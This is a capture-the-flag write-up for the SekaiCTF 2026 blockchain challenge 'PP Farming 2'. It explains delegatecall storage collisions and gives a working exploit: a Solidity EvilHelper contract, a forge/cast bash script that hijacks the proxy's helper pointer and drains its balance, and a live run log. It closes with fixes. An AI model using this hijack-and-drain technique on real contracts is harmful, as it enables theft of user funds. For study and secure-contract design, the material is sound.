---
title: "PP Farming 2"
ctf: "SekaiCTF 2026"
date: 2026-07-01
category: blockchain
difficulty: medium
points: 0
flag_format: "SEKAI{...}"
author: "sid"
---

# PP Farming 2

## Summary

`withdrawPP()` now has a `noReentrancy` modifier, so the original re-entrancy
trick is dead. The real bug is a **storage collision through the ATM's
proxy-style `fallback()`**. The fallback happily delegatecalls arbitrary
calldata into the helper contract (it only blacklists one selector), and the
helper's `atm` variable lands on the exact same storage slot as the ATM's own
`performancePointHelper` pointer. That lets an attacker hijack which contract
`withdrawPP()` delegatecalls into, then swap in a malicious helper that drains
the whole balance.

## Background: delegatecall and why storage layout is a security boundary

To understand the attack you need to understand `delegatecall` at the EVM
level. Not just "it runs code in the caller's context," but what that actually
means for storage.

### How `delegatecall` works

Normal `call`: contract A calls contract B, B's code runs in B's context, B's
storage is affected, B's `address(this)` is B.

`delegatecall`: contract A calls contract B, B's code runs in **A's** context.
A's storage is affected. A's balance is affected. `address(this)` inside B's
code is A. B's own storage is never touched.

This is what makes proxy patterns possible. A thin proxy holds the ETH and
state, delegates all logic to an implementation contract that can be upgraded,
and everything "happens" in the proxy's storage. Users always interact with the
same proxy address.

The catch (and this is the whole attack) is that `delegatecall` uses
**slot numbers**, not variable names. Solidity assigns storage slots in
declaration order: first declared variable gets slot 0, second gets slot 1, and
so on. When B's code runs in A's context via `delegatecall`, any read or write
to "slot $k$ in B's layout" actually reads or writes slot $k$ in A's storage.
If the two contracts have different types at slot $k$, you get a silent type
confusion that can corrupt critical state.

More precisely: given contracts $A$ and $B$ with storage layouts

$$A: \quad \text{slot}_0 \to v_0^A,\quad \text{slot}_1 \to v_1^A, \quad \ldots$$
$$B: \quad \text{slot}_0 \to v_0^B,\quad \text{slot}_1 \to v_1^B, \quad \ldots$$

a `delegatecall` from $A$ into $B$ that executes `sstore(k, x)` writes `x`
into $\text{slot}_k$ of $A$'s storage, overwriting $v_k^A$ regardless of what
type $v_k^B$ is. The compiler never checks that $v_k^A$ and $v_k^B$ agree.

This is called a **storage collision**, and it's not a theoretical concern.
The Parity Wallet hack in 2017 ($30\text{M}$ lost) was exactly this: a `delegatecall`
in a multisig wallet's fallback function let anyone call `initWallet()` on the
library contract, which reinitialised the wallet and made the attacker the owner.
The slot layout between the wallet and the library was misaligned in a way the
original developers didn't notice.

### Why standard proxy patterns solve this

EIP-1967 (the "transparent proxy" standard, used by OpenZeppelin's upgradeable
contracts) sidesteps storage collisions by storing the implementation address in
a *pseudorandom* slot derived from a hash:

```
bytes32 constant IMPL_SLOT =
    bytes32(uint256(keccak256("eip1967.proxy.implementation")) - 1);
    // = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc
```

No handwritten Solidity variable sits at that slot. The implementation address
lives there by direct `sstore`, invisible to the normal declaration-order layout.
An attacker can't craft a collision by looking at the implementation contract's
variable list, because finding a declared variable that hashes to that slot would
require a preimage attack on Keccak-256.

The challenge's ATM doesn't use EIP-1967. It stores `performancePointHelper`
as a normal `address` at slot 1. The helper contract stores `atm` as a normal
`address` at slot 1 too. Those two overlap.

## Solution

### Step 1: Line up the storage slots

Solidity assigns storage slots in declaration order, and `delegatecall`
executes the callee's code against the *caller's* storage. Compare the two
contracts:

| Slot | `PerformancePointATM` (caller)     | `PerformancePointHelper` (callee) |
|------|-------------------------------------|-------------------------------------|
| 0    | `mapping(address=>uint256) scores`  | `uint256 id_number`                 |
| 1    | `address performancePointHelper`    | `address atm`                       |
| 2    | `bool locked`                        | `bool helping`                      |

Slot 1 in the helper (`atm`) aliases slot 1 in the ATM
(`performancePointHelper`) when the helper's code runs via delegatecall. So any
helper function that writes `atm = X` (like `setATM(address)`) actually
overwrites the ATM's real `performancePointHelper` pointer.

You can verify this by thinking through what the EVM sees: the helper's
`setATM(address _atm)` compiles to `sstore(1, _atm)`. When that runs via
`delegatecall` from the ATM, `sstore(1, _atm)` writes to slot 1 of the ATM's
storage. Slot 1 of the ATM is `performancePointHelper`. The compiler never
checks that the names match.

### Step 2: Reach `setATM` through the fallback

```solidity
fallback() external payable {
    address _impl = performancePointHelper;
    bytes4 selector = msg.sig;

    // Block withdrawing without proxy
    bytes4 initSelector = bytes4(keccak256("processWithdrawal(address,uint256)"));
    require(selector != initSelector, "processWithdrawal blocked");

    assembly {
        let ptr := mload(0x40)
        calldatacopy(ptr, 0, calldatasize())
        let success := delegatecall(gas(), _impl, ptr, calldatasize(), 0, 0)
        returndatacopy(ptr, 0, returndatasize())
        if iszero(success) { revert(ptr, returndatasize()) }
        return(ptr, returndatasize())
    }
}
```

The fallback only blacklists `processWithdrawal(address,uint256)`. Every other
selector on the helper is reachable through the ATM itself, including
`setATM(address)`, `stopHelping()`, and `startHelping()`. There's no access
control on any of them.

Calling `ATM.setATM(evilHelper)` routes through the fallback, runs
`PerformancePointHelper.setATM` via delegatecall, which executes `sstore(1,
evilHelper)` in the ATM's storage, silently repointing
`ATM.performancePointHelper` at an attacker-controlled contract.

The selector blacklist is the kind of defense that feels reasonable until you
think about it for five minutes. The developer locked the front door and left
every window open. A function that doesn't check access control on a mutating
operation is not made safe by being reachable only through a fallback. It's
still reachable.

### Step 3: Drop in a malicious helper and withdraw

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract EvilHelper {
    // runs in ATM storage context via delegatecall
    function processWithdrawal(address payable recipient, uint256 amount) external returns (bool) {
        (bool s, ) = recipient.call{value: address(this).balance}("");
        return s;
    }
}
```

`EvilHelper.processWithdrawal` ignores the `amount` argument entirely and
forwards the *full* ATM balance to the caller. `address(this).balance` here
refers to the ATM's balance, not EvilHelper's, because the code runs by
`delegatecall` and `this` is always the ATM. The `amount` parameter would limit
the withdrawal if the real helper used it. EvilHelper doesn't bother.

The full attack sequence:

1. Deploy `EvilHelper`.
2. Call `ATM.setATM(evilHelper)`. Goes through the fallback, delegatecalls
   `setATM`, overwrites slot 1. `performancePointHelper` now points at `EvilHelper`.
3. `donatePP(self)` with a trivial amount so `scores[self] > 0` and
   `withdrawPP()`'s `require` passes.
4. Call `withdrawPP()`. `noReentrancy` doesn't matter. This is a single
   normal call that now delegatecalls into `EvilHelper.processWithdrawal`, which
   sweeps the entire ATM balance to the caller.
5. `isSolved()` returns `true` once `address(this).balance == 0`.

The reentrancy guard the developer added to fix PP Farming 1 is completely
irrelevant here. It protects against a different threat model, one that involves
re-entering during a call. The storage collision happens before any withdrawal
even occurs.

```bash
#!/usr/bin/env bash
# PP Farming 2 - storage collision / fallback delegatecall hijack
set -euo pipefail

RPC_URL="http://REPLACE_RPC"
PK="REPLACE_PRIVKEY"
ATM_ADDR="REPLACE_ATM"

# 1. Deploy the malicious helper
EVIL=$(forge create --rpc-url "$RPC_URL" --private-key "$PK" --broadcast \
    src/Evil.sol:EvilHelper --json | jq -r .deployedTo)
echo "EvilHelper: $EVIL"

# 2. Hijack performancePointHelper via the unauthenticated fallback ->
#    delegatecall into PerformancePointHelper.setATM(address), which
#    aliases ATM's own performancePointHelper storage slot.
cast send "$ATM_ADDR" "setATM(address)" "$EVIL" \
    --rpc-url "$RPC_URL" --private-key "$PK"

cast call "$ATM_ADDR" "performancePointHelper()(address)" --rpc-url "$RPC_URL"
# ^ should now print $EVIL

# 3. Seed a nonzero score so withdrawPP()'s require passes
cast send "$ATM_ADDR" "donatePP(address)" "$(cast wallet address --private-key "$PK")" \
    --value 0.01ether --rpc-url "$RPC_URL" --private-key "$PK"

# 4. Withdraw - ATM now delegatecalls EvilHelper.processWithdrawal, which
#    drains address(this).balance (full ATM balance) to us.
cast send "$ATM_ADDR" "withdrawPP()" --rpc-url "$RPC_URL" --private-key "$PK"

# 5. Confirm
cast call "$ATM_ADDR" "isSolved()(bool)" --rpc-url "$RPC_URL"
```

Live run against the instance:

```
$ cast call $ATM_ADDR "performancePointHelper()(address)" --rpc-url $RPC_URL
0x074D594A86Fd354B09C860e0254c645aAf5A66e3        # original helper

$ forge create --rpc-url $RPC_URL --private-key $PK --broadcast src/Evil.sol:EvilHelper
Deployed to: 0xb77292E167831C731082e184b83b200F9Fadb21C

$ cast send $ATM_ADDR "setATM(address)" $EVIL --rpc-url $RPC_URL --private-key $PK
status               1 (success)

$ cast call $ATM_ADDR "performancePointHelper()(address)" --rpc-url $RPC_URL
0xb77292E167831C731082e184b83b200F9Fadb21C        # hijacked

$ cast send $ATM_ADDR "donatePP(address)" $PLAYER --value 0.01ether --rpc-url $RPC_URL --private-key $PK
status               1 (success)

$ cast send $ATM_ADDR "withdrawPP()" --rpc-url $RPC_URL --private-key $PK
status               1 (success)

$ cast balance $ATM_ADDR --rpc-url $RPC_URL --ether
0.000000000000000000

$ cast call $ATM_ADDR "isSolved()(bool)" --rpc-url $RPC_URL
true
```

## What a real fix looks like

Three things the developer should have done differently:

**Use EIP-1967 slot for the implementation pointer.** Store `performancePointHelper`
at `keccak256("atm.helper.implementation") - 1` instead of a declared variable.
Any collision would require finding a Keccak-256 preimage, which is computationally
infeasible.

**Add access control to `setATM`.** Even with the storage collision present,
if `setATM` required `msg.sender == owner`, an external attacker couldn't call
it. Defense in depth matters. The fallback is open, but the functions it
reaches shouldn't be.

**Validate selectors against an allowlist, not a blocklist.** Blocking one
selector while allowing all others is almost always the wrong model. The fallback
should only forward specific known-safe selectors, not everything except one
dangerous one.

The storage collision is the core bug, but the lack of access control on
`setATM` is what makes it exploitable from outside. Fix either one and the
attack fails.

## Flag

```
SEKAI{pr0xie5_4r3_h4rD_2_3t4k3}
```
